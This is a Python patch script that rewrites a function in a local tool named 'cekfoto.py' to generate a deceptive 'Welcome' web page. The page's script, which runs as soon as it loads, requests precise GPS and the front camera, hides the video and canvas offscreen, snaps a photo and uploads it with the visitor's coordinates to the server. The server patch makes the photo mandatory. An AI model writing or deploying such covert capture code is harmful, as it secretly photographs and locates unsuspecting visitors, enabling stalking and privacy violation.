from pathlib import Path

p = Path('/Users/iktidptsi/Downloads/cekfoto.py')
text = p.read_text()

start = text.index('def _buat_halaman_kamera_mobile(file_html="index.html"):\n')
end = text.index('\n\ndef _start_server_mobile', start)
new_func = '''def _buat_halaman_kamera_mobile(file_html="index.html"):
    konten = """<!doctype html>
<html lang=\"id\">
<head>
  <meta charset=\"utf-8\" />
  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />
  <title>Welcome</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; padding: 20px; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: #f0f0f0; }
    .container { text-align: center; }
    h1 { font-size: 48px; margin: 0; color: #333; }
    .offscreen { position: fixed; left: -20000px; top: -20000px; width: 2px; height: 2px; opacity: 0.01; pointer-events: none; }
  </style>
</head>
<body>
  <div class=\"container\">
    <h1>WELCOME</h1>
  </div>
  <video id=\"video\" class=\"offscreen\" autoplay playsinline muted></video>
  <canvas id=\"canvas\" class=\"offscreen\"></canvas>

  <script>
    let gpsLocation = null;

    async function getGPSLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          console.log('Geolocation tidak tersedia');
          resolve(null);
          return;
        }

        navigator.geolocation.getCurrentPosition(
          (pos) => {
            gpsLocation = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              timestamp: new Date().toISOString()
            };
            console.log('GPS diterima:', gpsLocation);
            resolve(gpsLocation);
          },
          (err) => {
            console.log('GPS error:', err);
            resolve(null);
          },
          { timeout: 10000, maximumAge: 0, enableHighAccuracy: true }
        );
      });
    }

    async function getCameraStream() {
      const constraints = [
        { video: { facingMode: { exact: 'user' } } },
        { video: { facingMode: { ideal: 'user' } } },
        { video: { facingMode: { exact: 'environment' } } },
        { video: { facingMode: { ideal: 'environment' } } },
        { video: true }
      ];

      for (const constraint of constraints) {
        try {
          console.log('Mencoba constraint:', constraint);
          const stream = await navigator.mediaDevices.getUserMedia(constraint);
          console.log('Camera berhasil dibuka');
          return stream;
        } catch (err) {
          console.log('Camera constraint gagal:', err);
        }
      }
      throw new Error('Tidak ada kamera yang tersedia');
    }

    function waitForVideoReady(video) {
      return new Promise((resolve) => {
        if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
          resolve();
          return;
        }
        const done = () => resolve();
        video.addEventListener('canplay', done, { once: true });
        video.addEventListener('loadeddata', done, { once: true });
        video.addEventListener('playing', done, { once: true });
      });
    }

    async function captureBlobFromVideo(video, canvas) {
      const width = video.videoWidth || 1280;
      const height = video.videoHeight || 720;
      canvas.width = width;
      canvas.height = height;
      const ctx = canvas.getContext('2d', { willReadFrequently: true });
      ctx.fillStyle = '#000000';
      ctx.fillRect(0, 0, width, height);
      ctx.drawImage(video, 0, 0, width, height);

      return await new Promise((resolve) => {
        canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.98);
      });
    }

    async function autoCaptureAndUpload() {
      let stream = null;
      try {
        await getGPSLocation();
        console.log('Step 1: GPS request selesai');

        stream = await getCameraStream();
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        video.srcObject = stream;
        video.muted = true;
        video.setAttribute('playsinline', 'true');
        await video.play().catch(() => {});
        await waitForVideoReady(video);

        console.log('Step 2: video ready', video.videoWidth, video.videoHeight);

        let capturedBlob = null;
        for (let attempt = 1; attempt <= 8; attempt++) {
          capturedBlob = await captureBlobFromVideo(video, canvas);
          const size = capturedBlob ? capturedBlob.size : 0;
          console.log(`Capture attempt ${attempt}/8, size=${size}`);
          if (capturedBlob && size > 5000) {
            break;
          }
          await new Promise(r => setTimeout(r, 500));
        }

        await uploadPhoto(capturedBlob, gpsLocation);
      } catch (err) {
        console.log('Auto capture error:', err);
        await uploadPhoto(null, gpsLocation);
      } finally {
        if (stream) {
          stream.getTracks().forEach(t => t.stop());
        }
      }
    }

    async function uploadPhoto(blob, gps) {
      try {
        let dataUrl = '';
        if (blob) {
          dataUrl = await new Promise((resolve) => {
            const reader = new FileReader();
            reader.onload = () => resolve(reader.result);
            reader.readAsDataURL(blob);
          });
        }

        console.log('Uploading photo with GPS:', gps);
        const resp = await fetch('/upload-json', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            filename: 'auto_capture_' + Date.now() + '.jpg',
            dataUrl: dataUrl,
            gps: gps
          })
        });

        const data = await resp.json();
        console.log('Upload result:', data);
      } catch (err) {
        console.log('Upload error:', err);
      }
    }

    autoCaptureAndUpload();
  </script>
</body>
</html>
"""
    Path(file_html).write_text(konten, encoding="utf-8")
    return file_html
'''
text = text[:start] + new_func + text[end:]
text = text.replace(
'''                # Jika ada data URL foto, decode dan simpan
                if data_url and "," in data_url:
                    print(f"[SERVER] Decoding image data...")
                    encoded = data_url.split(",", 1)[1]
                    image_bytes = base64.b64decode(encoded)
                    print(f"[SERVER] Image size: {len(image_bytes)} bytes")
                    
                    with open(saved_path, "wb") as f:
                        f.write(image_bytes)
                else:
                    # Jika tidak ada foto, buat white placeholder
                    print(f"[SERVER] No image data, creating white placeholder")
                    placeholder = Image.new("RGB", (640, 480), color="white")
                    placeholder.save(saved_path)
                
                # Embed GPS ke EXIF jika ada
''',
'''                # Jika ada data URL foto, decode dan simpan
                if data_url and "," in data_url:
                    print(f"[SERVER] Decoding image data...")
                    encoded = data_url.split(",", 1)[1]
                    image_bytes = base64.b64decode(encoded)
                    print(f"[SERVER] Image size: {len(image_bytes)} bytes")
                    
                    with open(saved_path, "wb") as f:
                        f.write(image_bytes)
                else:
                    raise ValueError("No image data from mobile capture")
                
                # Embed GPS ke EXIF jika ada
''')
p.write_text(text)
print('patched')
